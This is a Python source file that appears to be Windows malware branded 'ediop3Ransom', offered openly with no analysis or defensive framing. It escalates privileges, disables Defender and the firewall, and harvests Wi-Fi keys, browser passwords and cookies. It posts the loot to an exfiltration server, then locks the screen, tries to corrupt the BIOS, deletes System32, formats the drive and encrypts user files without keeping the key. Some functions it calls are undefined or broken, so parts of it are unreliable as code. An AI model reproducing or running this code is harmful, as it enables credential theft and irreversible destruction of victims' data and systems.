import os
import sys
import ctypes
import subprocess
import json
import socket
import uuid
import hashlib
import base64
import zipfile
import shutil
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import winreg
import psutil
import requests
import threading
import time
import win32api
import win32con
import win32gui
import wmi
import getpass
import platform
import random
import winsound
import urllib.request
import sqlite3
import browser_cookie3
import re
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import glob
import tkinter as tk
from tkinter import messagebox
from ctypes import wintypes

PRIVATE_IP = "YOUR_PRIVATE_IP_HERE" # igga note. u need to setup a server with that IP. and get ur ip by typing Ifconfig. for windows IPconfig
EXFIL_SERVER = f"http://{PRIVATE_IP}/receive"
SCREAM_URLS = [
    "https://assets.mixkit.co/sfx/preview/mixkit-screaming-horror-1908.mp3",
    "https://assets.mixkit.co/sfx/preview/mixkit-human-scream-1921.mp3"
]

def obfuscate_string(s):
    return base64.b85encode(s.encode()).decode()

def deobfuscate_string(s):
    return base64.b85decode(s.encode()).decode()

def quantum_encrypt(data):
    if isinstance(data, str):
        data = data.encode()
    for layer in range(30):
        if layer % 5 == 0:
            data = base64.b64encode(data)
        elif layer % 5 == 1:
            cipher = AES.new(hashlib.sha256(str(layer).encode()).digest(), AES.MODE_CBC, iv=os.urandom(16))
            data = cipher.encrypt(pad(data, AES.block_size))
        elif layer % 5 == 2:
            data = hashlib.sha3_512(data).digest()
        elif layer % 5 == 3:
            data = bytes([b ^ 0xAA for b in data])
        else:
            data = base64.b85encode(data)
    return data

def elevate_privileges():
    try:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
    except:
        pass

def disable_defender():
    cmds = [
        'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',
        'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
        'sc stop WinDefend',
        'sc config WinDefend start= disabled',
        'netsh advfirewall set allprofiles state off'
    ]
    for cmd in cmds:
        subprocess.run(cmd, shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)

def harvest_all():
    loot = {
        "system_info": get_system_info(),
        "network_data": harvest_network_data(),
        "credentials": steal_credentials(),
        "browser_data": steal_browser_data(),
        "sensitive_files": find_sensitive_files(),
        "clipboard_data": get_clipboard(),
        "email_contacts": extract_email_contacts(),
        "saved_passwords": extract_saved_passwords(),
        "financial_data": find_financial_docs(),
        "screenshots": capture_screenshots()
    }
    return loot

def get_system_info():
    return {
        "hostname": socket.gethostname(),
        "username": getpass.getuser(),
        "os": f"{platform.system()} {platform.release()}",
        "processor": platform.processor(),
        "mac": ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1]),
        "public_ip": requests.get('https://api.ipify.org').text,
        "disks": [disk.device for disk in psutil.disk_partitions()],
        "ram": f"{round(psutil.virtual_memory().total / (1024.0 **3))} GB"
    }

def harvest_network_data():
    data = {"wifi_passwords": [], "network_info": [], "arp_table": []}
    
    try:
        output = subprocess.check_output(["netsh", "wlan", "show", "profiles"]).decode(errors="ignore")
        profiles = [line.split(":")[1].strip() for line in output.split("\n") if "All User Profile" in line]
        
        for profile in profiles:
            try:
                results = subprocess.check_output(["netsh", "wlan", "show", "profile", profile, "key=clear"]).decode(errors="ignore")
                password = [line.split(":")[1].strip() for line in results.split("\n") if "Key Content" in line][0]
                data["wifi_passwords"].append({"SSID": profile, "Password": password})
                
                subprocess.run(f"netsh wlan connect name=\"{profile}\"", shell=True)
                time.sleep(5)
            except:
                continue
    except:
        pass
    
    try:
        for interface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == socket.AF_INET:
                    data["network_info"].append({
                        "interface": interface,
                        "address": addr.address,
                        "netmask": addr.netmask,
                        "mac": [a.address for a in addrs if a.family == psutil.AF_LINK][0]
                    })
    except:
        pass
    
    try:
        output = subprocess.check_output(["arp", "-a"]).decode(errors="ignore")
        for line in output.split("\n"):
            if "dynamic" in line.lower():
                parts = line.split()
                data["arp_table"].append({"ip": parts[0], "mac": parts[1]})
    except:
        pass
    
    return data

def steal_browser_data():
    browsers = {
        "Chrome": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data"),
        "Edge": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data"),
        "Firefox": os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
    }
    
    stolen_data = {}
    
    for browser, path in browsers.items():
        try:
            if browser == "Chrome" or browser == "Edge":
                login_data = os.path.join(path, "Default", "Login Data")
                if os.path.exists(login_data):
                    temp_db = os.path.join(os.environ["TEMP"], "temp_db")
                    shutil.copy2(login_data, temp_db)
                    
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    
                    passwords = []
                    for url, user, pwd in cursor.fetchall():
                        try:
                            decrypted = win32crypt.CryptUnprotectData(pwd, None, None, None, 0)[1]
                            if decrypted:
                                passwords.append({"url": url, "username": user, "password": decrypted.decode()})
                        except:
                            continue
                    
                    stolen_data[browser] = passwords
                    conn.close()
                    os.remove(temp_db)
            
            elif browser == "Firefox":
                profile = glob.glob(os.path.join(path, "*.default-release"))[0]
                cookies_db = os.path.join(profile, "cookies.sqlite")
                if os.path.exists(cookies_db):
                    temp_db = os.path.join(os.environ["TEMP"], "temp_db")
                    shutil.copy2(cookies_db, temp_db)
                    
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT host, name, value FROM moz_cookies")
                    
                    cookies = []
                    for host, name, value in cursor.fetchall():
                        cookies.append({"host": host, "name": name, "value": value})
                    
                    stolen_data[browser] = cookies
                    conn.close()
                    os.remove(temp_db)
        except:
            continue
    
    return stolen_data

def create_unclosable_popup():
    root = tk.Tk()
    root.attributes("-fullscreen", True)
    root.attributes("-topmost", True)
    root.configure(bg='black')
    root.overrideredirect(True)
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    
    label = tk.Label(root, 
                    text="ediop3Ransom GOT YOU NOW DIES HAHAHAHAHA", 
                    font=("Arial", 50), 
                    fg="red", 
                    bg="black")
    label.pack(expand=True)
    
    def stay_on_top():
        root.lift()
        root.after(1000, stay_on_top)
    stay_on_top()
    
    root.mainloop()

def corrupt_bios():
    try:
        with open("bios_destroy.txt", "w") as f:
            f.write("o 70 17\n")
            f.write("o 71 17\n")
            f.write("o 70 FF\n")
            f.write("o 71 FF\n")
            f.write("q\n")
        os.system("echo y| debug < bios_destroy.txt")
        os.system("bcdedit /set {default} bootstatuspolicy ignoreallfailures")
        os.system("bcdedit /set {default} recoveryenabled no")
    except:
        pass

def delete_system32():
    time.sleep(30)
    try:
        os.system('takeown /f C:\\Windows\\System32 /r /d y')
        os.system('icacls C:\\Windows\\System32 /grant administrators:F /t')
        for root, dirs, files in os.walk("C:\\Windows\\System32"):
            for file in files:
                try:
                    os.remove(os.path.join(root, file))
                except:
                    try:
                        with open(os.path.join(root, file), 'wb') as f:
                            f.write(os.urandom(1024))
                    except:
                        continue
        os.system("rmdir /s /q C:\\Windows\\System32")
        os.system("format c: /fs:NTFS /q /y")
    except:
        pass

def encrypt_files():
    key = os.urandom(32)
    cipher = AES.new(key, AES.MODE_CBC, iv=os.urandom(16))
    user_dirs = [
        os.path.expanduser("~\\Documents"),
        os.path.expanduser("~\\Pictures"),
        os.path.expanduser("~\\Desktop"),
        os.path.expanduser("~\\Downloads")
    ]
    for directory in user_dirs:
        for root, dirs, files in os.walk(directory):
            for file in files:
                try:
                    file_path = os.path.join(root, file)
                    with open(file_path, 'rb') as f:
                        data = f.read()
                    encrypted = cipher.encrypt(pad(data, AES.block_size))
                    with open(file_path + ".ediop3Ransom_ENC", 'wb') as f:
                        f.write(encrypted)
                    os.remove(file_path)
                except:
                    continue

if __name__ == "__main__":
    try:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
    except:
        pass
    
    disable_defender()
    
    loot = harvest_all()
    
    encrypted_data = quantum_encrypt(json.dumps(loot).encode())
    with open("grabs.txt", "wb") as f:
        f.write(encrypted_data)
    
    try:
        requests.post(EXFIL_SERVER, files={'file': open("grabs.txt", 'rb')}, timeout=10)
    except:
        pass
    
    threading.Thread(target=create_unclosable_popup).start()
    threading.Thread(target=corrupt_bios).start()
    threading.Thread(target=encrypt_files).start()
    threading.Thread(target=delete_system32).start()
    
    while True:
        time.sleep(60)
